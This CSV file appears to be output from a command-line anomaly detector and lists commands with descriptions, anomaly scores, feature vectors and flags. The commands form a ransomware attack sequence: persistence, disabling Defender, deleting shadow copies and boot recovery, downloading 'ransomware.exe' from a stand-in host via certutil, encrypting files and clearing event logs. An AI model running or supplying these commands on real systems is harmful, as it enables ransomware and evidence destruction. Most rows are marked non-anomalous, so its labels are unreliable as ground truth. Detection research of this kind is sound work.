commandline,Analysis,is_anomaly,anomaly_score,behavioral_complexity,feature_vector,behavioral_flags
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v Ransomware /t REG_SZ /d ""C:\temp\encrypt.exe"" /f",Registry Key Value Addition | Category: Windows Registry Modification | OS: Windows,False,0.5034906527588204,0.0,"{'length': 112, 'num_args': 10, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': True, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': True, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}","['AUTOEXEC_REG_MOD', 'TEMP_DIR_EXECUTION']"
sc stop WinDefend,Windows Service Stop | Category: Service Manipulation | OS: Windows,False,0.040320986195182,0.0,"{'length': 17, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': True, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f",Registry Key Value Addition | Category: Windows Registry Modification | OS: Windows,False,0.13743437893213792,0.0,"{'length': 102, 'num_args': 11, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': True, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
vssadmin delete shadows /all /quiet,Volume Shadow Copy Deletion | Category: Volume Shadow Copy Manipulation | OS: Windows | MITRE: T1490 (Inhibit System Recovery) | Tactic: IMPACT | Confidence: High,False,0.23109001074007912,0.0,"{'length': 35, 'num_args': 5, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': True, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': True, 'has_process': False, 'complexity_score': 0}",['BACKUP_MANIPULATION']
bcdedit /set {default} recoveryenabled No,Boot Configuration Recovery Disabled | Category: Other Suspicious / Malicious Patterns | OS: Windows,False,0.0932175384454185,0.5,"{'length': 41, 'num_args': 5, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0.5}",[]
bcdedit /set {default} bootstatuspolicy ignoreallfailures,Boot Status Policy Disabled | Category: Other Suspicious / Malicious Patterns | OS: Windows,False,0.23950886125443682,0.5,"{'length': 57, 'num_args': 5, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0.5}",[]
net use Z: \\server\shared_folder /user:domain\user password,Network Drive Mapping | Category: Share and Session Enumeration | OS: Windows,False,0.3163430375252766,0.0,"{'length': 60, 'num_args': 6, 'has_path': True, 'has_network': True, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': True, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
"powershell -Command ""Get-ChildItem -Path C:\ -Include *.docx,*.pdf,*.xls,*.xlsx,*.ppt,*.pptx -Recurse | Select-Object FullName""",Unknown Activity,False,0.41333333333333333,1.0,"{'length': 127, 'num_args': 11, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 1}",[]
"certutil.exe -urlcache -split -f ""http://malicious.com/ransomware.exe"" C:\temp\encrypt.exe",File Download (CertUtil) | Category: File Download and Upload | OS: Windows,True,0.8018315145690311,0.0,"{'length': 90, 'num_args': 6, 'has_path': True, 'has_network': True, 'has_encoded': False, 'has_execution': True, 'has_privilege': False, 'has_crypto': True, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}","['FILE_DOWNLOAD_UTIL', 'TEMP_DIR_EXECUTION']"
C:\temp\encrypt.exe --encrypt-all,Unknown Activity,False,0.27844067764388664,0.0,"{'length': 33, 'num_args': 2, 'has_path': True, 'has_network': False, 'has_encoded': True, 'has_execution': True, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",['TEMP_DIR_EXECUTION']
del C:\temp\encrypt.exe,Unknown Activity,False,0.12895383349421968,0.0,"{'length': 23, 'num_args': 2, 'has_path': True, 'has_network': False, 'has_encoded': False, 'has_execution': True, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': True, 'has_process': False, 'complexity_score': 0}",['TEMP_DIR_EXECUTION']
wevtutil cl System,Unknown Activity,False,0.021356317077987755,0.0,"{'length': 18, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': True, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
wevtutil cl Security,Unknown Activity,False,0.050942415650326034,0.0,"{'length': 20, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
wevtutil cl Application,Unknown Activity,False,0.1118592199337696,0.0,"{'length': 23, 'num_args': 3, 'has_path': False, 'has_network': False, 'has_encoded': False, 'has_execution': False, 'has_privilege': False, 'has_crypto': False, 'has_download': False, 'has_registry': False, 'has_service': False, 'has_user': False, 'has_file_ops': False, 'has_process': False, 'complexity_score': 0}",[]
